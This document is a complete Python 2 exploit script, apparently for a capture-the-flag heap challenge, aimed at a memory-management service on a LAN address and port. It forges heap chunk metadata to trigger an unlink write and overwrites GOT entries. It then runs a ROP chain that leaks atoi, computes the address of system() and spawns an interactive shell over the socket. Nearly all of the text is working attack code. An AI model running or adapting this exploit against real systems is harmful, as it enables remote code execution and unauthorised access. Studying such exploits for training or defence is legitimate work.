#!/usr/bin/python

import struct
import socket
import telnetlib

HOST = "192.168.1.108"
PORT = 5555

ALLOC = 1
DEALLOC = 2
EDIT = 3
LENGTH = 4

MEMORY_ARRAY = 0x602140		# starting address of memory_array
Offset = 0xc6f0			# Offset between atoi and system call

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

s.connect((HOST,PORT))

## function to read until delim form socket
def readuntil(s, delim="\n"):
  line = ""
  while True:
    b = s.recv(1)
    if b == delim:
      break
    line += b
  return line

## function to allocate memory of size -> size
def allocate(size):
	global s

	s.send(str(ALLOC)+"\n")
	s.send(str(size)+"\n")
	idx = readuntil(s,"\n").strip()
	readuntil(s,"\n").strip()

	print "Allocated id =",idx[:-1]," size :",str(size)

## function to change content of memory address present at
## idx index of memory_array with the content of buff
def change_memory(idx,buff):
	global s

	s.send(str(EDIT)+"\n")
	s.send(str(idx)+"\n")
	s.send(str(len(buff))+"\n")
	s.send(buff+"\n")

	print "EDIT: %s"%readuntil(s,"\n").strip()

## function to deallocate the memory address present at
## idx index of memory_array
def dealloc(idx):
	global s

	s.send(str(DEALLOC)+"\n")
	s.send(str(idx)+"\n")

	print "DEALLOC : %s"%readuntil(s,"\n").strip()

allocate(1024)					# index = 1
allocate(1024)					# index = 2

allocate(8)					# index = 3
allocate(8)					# index = 4
allocate(8)					# index = 5

structs = struct.pack("<Q",0x100)		# prevsize
structs+= struct.pack("<Q",0x100)		# size
structs+= struct.pack("<Q",0x602150 - 0x18)	# p->fd ; p->fd->bk = p->bk
structs+= struct.pack("<Q",0x602150 - 0x10)	# p->bk ; p->bk->fd = p->fd

overflow = "A"*8			# JUNK
overflow += "B"*8			# JUNK
overflow += struct.pack("<Q",0x420)	# prevsize
overflow += struct.pack("<Q",0x100)	# size
overflow += struct.pack("<Q",0)*4	# fd ; bk ; fd_nextsize ; bk_nextsize
overflow += "A"*8*27			## DOUBT
overflow += struct.pack("<Q",0x21)	## DOUBT imagenory size
overflow += struct.pack("<Q",0x1)*4	# imagenory fd;bk;fd_nextsize;bk_nextsize

change_memory(2,structs)
change_memory(3,overflow)
dealloc(4)

### ROP Gadgets

atol_got = struct.pack("<Q",0x602080)	# .got.plt address
pppret = struct.pack("<Q",0x0400dbf)	# pop;pop;pop;ret
prsppppret = struct.pack("<Q",0x400dbd)	# pop rsp;pop;pop;pop;ret
rop_addr = struct.pack("<Q",0x602150)	# ropchain address
got_puts = struct.pack("<Q",0x602020)	# .got.plt address of puts
prdiret = struct.pack("<Q",0x400dc3)	# pop rdi;ret
atoi_got = struct.pack("<Q",0x602088)	# .got.plt addredd of atoi
pr14pr15ret = struct.pack("<Q",0x400dc0)# pop r14; pop r15 ; ret
puts = struct.pack("<Q",0x400760)	# puts function addr
fflush = struct.pack("<Q",0x400810)	# fflush function addr
read_loc = struct.pack("<Q",0xC46A4A + 0x70 -1)	# system sddress store location
prbpret = struct.pack("<Q",0x04008a0)	# pop rbp ; ret
do_read = struct.pack("<Q",0x0400B1E)	# fgets ; pppret
sh_addr = struct.pack("<Q",0x040047f)	# "sh" string address in binary


ropchain = "/bin/sh"			# JUNK
ropchain = "\x00"*17
ropchain += prdiret + atoi_got + pr14pr15ret + "A"*16 + puts	## prints the atoi .got.plt entry entry at runtime
ropchain += prdiret + struct.pack("<Q",0x0) + fflush		## fflushes the input buffer
ropchain += prbpret + read_loc + do_read + "A"*16		## reads system address adjusted according to atoi .got.plt address
ropchain += prdiret + rop_addr					## sets arguments for system function call
ropchain += prdiret + sh_addr					## sets arguments for system function call
ropchain += prsppppret + struct.pack("<Q",0xC46A4A - 0x18)	## pivot stack to read_loc and then retn to call system

bag_over = "A"*16			# JUNK before bag start
bag_over += atol_got			# idx = 1 ptr overwrite
bag_over += ropchain			# idx = 2 ptr overwrite

change_memory(2,bag_over)		# put bag_over in idx=2 memory address
change_memory(1,pppret)			# put pppret in idx=1 memory address

ropchain_deref = prsppppret + rop_addr	# pivoting the stack to rop_addr
s.send(str(DEALLOC)+"\n")
s.send(ropchain_deref)			# TRRIGER THE ROPCHAIN ; buffer to pivot stack

## get atoi leaked address
lk = s.recv(8)[:-1][::-1].encode("hex")
lk = int(lk,16)
print "atoi : %s"%(hex(lk))

## send system address
system_int = lk + Offset
system = struct.pack("<Q",system_int)
s.send(system)
print "System : %s"%(hex(system_int))

t = telnetlib.Telnet()
t.sock = s
t.interact()
